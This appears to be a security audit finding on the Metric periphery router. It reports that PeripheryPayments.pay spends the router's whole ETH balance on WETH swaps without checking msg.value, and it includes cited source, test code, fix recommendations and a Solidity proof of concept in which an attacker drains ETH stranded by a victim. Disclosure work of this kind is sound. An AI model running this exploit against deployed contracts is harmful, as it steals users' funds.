### Title
Router's Accumulated ETH Drained via WETH Payment Path Without `msg.value` Validation — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

The `pay` function in `PeripheryPayments.sol` uses the router's entire native ETH balance to fund WETH swaps without verifying that the ETH originated from the current transaction's `msg.value`. Any ETH stranded in the router from a prior transaction (e.g., a user who overpaid and omitted `refundETH`) can be silently consumed by a subsequent attacker calling `exactInputSingle{value: 0}(tokenIn: WETH, amountIn: X)`.

---

### Finding Description

In `PeripheryPayments.pay` (lines 73–84), when `token == WETH` and `address(this).balance >= value`, the function wraps the router's native ETH and transfers WETH to the pool **without ever calling `transferFrom` on the payer**: [1](#0-0) 

```solidity
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);  // ← no transferFrom from payer
    }
```

The `payer` argument (set to `msg.sender` at swap entry) is completely ignored in this branch. The router's entire ETH balance — including ETH left over from **previous transactions** — is eligible to fund the swap.

ETH accumulates in the router whenever a user sends `msg.value` in a multicall but omits `refundETH`. The most common trigger is `exactOutputSingle{value: X}` where the oracle-determined `amountIn < X`: the surplus `X − amountIn` is left stranded. [2](#0-1) 

A subsequent attacker then calls:

```solidity
router.exactInputSingle{value: 0}(
    ExactInputSingleParams({
        tokenIn: address(weth),
        amountIn: strandedAmount,   // ≤ router's ETH balance
        recipient: attacker,
        ...
    })
);
```

The callback fires `_justPayCallback` → `pay(WETH, attacker, pool, strandedAmount)`. Because `nativeBalance >= value`, the router wraps its own ETH and pays the pool. The attacker receives the full swap output at zero cost. [3](#0-2) 

The same `pay` path is reachable through `MetricOmmPoolLiquidityAdder.metricOmmModifyLiquidityCallback` when a WETH pool is involved, since that contract also inherits `PeripheryPayments`. [4](#0-3) 

---

### Impact Explanation

Direct loss of user principal. Any ETH stranded in the router is immediately claimable by any unprivileged attacker via a zero-value WETH swap. The attacker receives the full swap output while contributing nothing; the victim's overpaid ETH is permanently lost to them.

---

### Likelihood Explanation

The multicall + `refundETH` pattern is explicitly documented and tested: [5](#0-4) 

However, it is **not enforced**. Users calling `exactOutputSingle` with ETH overpayment, or any multicall user who omits `refundETH`, will leave ETH in the router. MEV bots monitoring the router's balance can drain it atomically in the next block. The precondition (stranded ETH) is a routine consequence of the documented usage pattern.

---

### Recommendation

Track the ETH consumed from `msg.value` in transient storage at each top-level payable entry point and validate in `pay` that the native balance drawn does not exceed the current call's `msg.value`. Alternatively, assert at the start of each payable entry that `address(this).balance == msg.value` (i.e., the router must be empty before each call), reverting if stale ETH is detected. A simpler guard: cap the native ETH used in `pay` to `msg.value` rather than `address(this).balance`.

---

### Proof of Concept

```solidity
// Step 1: Victim calls exactOutputSingle with 1 ETH but actual amountIn = 0.5 ETH.
// Victim forgets refundETH. Router now holds 0.5 ETH.
router.exactOutputSingle{value: 1 ether}(
    IMetricOmmSimpleRouter.ExactOutputSingleParams({
        pool: pool,
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountOut: someAmount,       // oracle prices such that amountIn = 0.5 ETH
        amountInMaximum: 1 ether,
        recipient: victim,
        deadline: block.timestamp + 1,
        priceLimitX64: 0,
        extensionData: ""
    })
);
// router.balance == 0.5 ETH (stranded)

// Step 2: Attacker calls with value: 0.
// pay() sees nativeBalance (0.5 ETH) >= value (0.5 ETH),
// wraps router's ETH, pays pool — no transferFrom on attacker.
router.exactInputSingle{value: 0}(
    IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: pool,
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: 0.5 ether,
        amountOutMinimum: 0,
        recipient: attacker,
        deadline: block.timestamp + 1,
        priceLimitX64: 0,
        extensionData: ""
    })
);
// Attacker receives token1 output; victim's 0.5 ETH is gone.
// router.balance == 0
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-78)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L130-147)
```text
  function exactOutputSingle(ExactOutputSingleParams calldata params) external payable returns (uint256 amountIn) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    int128 expectedAmountOut = MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountOut);
    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(params.recipient, params.zeroForOne, -expectedAmountOut, priceLimitX64, "", params.extensionData);
    int128 amountOut = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    if (amountOut != expectedAmountOut) revert InvalidOutputAmount(amountOut, params.amountOut);

    amountIn = MetricOmmSwapInputs.int128ToUint128(
      MetricOmmSwapResults.extractAmountIn(params.zeroForOne, amount0Delta, amount1Delta)
    );

    if (amountIn > params.amountInMaximum) revert InputTooHigh(amountIn, params.amountInMaximum);
    _clearExpectedCallbackPool();
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L192-199)
```text
  function _justPayCallback(int256 amount0Delta, int256 amount1Delta) private {
    pay(
      _getTokenToPay(),
      _getPayer(),
      msg.sender,
      uint256(MetricOmmSwapResults.extractPositiveAmount(amount0Delta, amount1Delta))
    );
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L172-177)
```text
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L106-133)
```text
  function test_multicall_ethInput_exactInputSingle_refundsUnusedEth() public {
    uint128 amountIn = 1_000;
    uint256 msgValue = 2 ether;
    uint256 swapperEthBefore = swapper.balance;

    vm.prank(swapper);
    bytes[] memory calls = new bytes[](2);
    calls[0] = abi.encodeWithSelector(
      router.exactInputSingle.selector,
      IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: recipient,
        deadline: _deadline(),
        priceLimitX64: 0,
        extensionData: ""
      })
    );
    calls[1] = abi.encodeWithSelector(router.refundETH.selector);
    router.multicall{value: msgValue}(calls);

    assertEq(swapper.balance, swapperEthBefore - amountIn, "unused eth refunded");
    _assertRouterEmpty();
  }
```
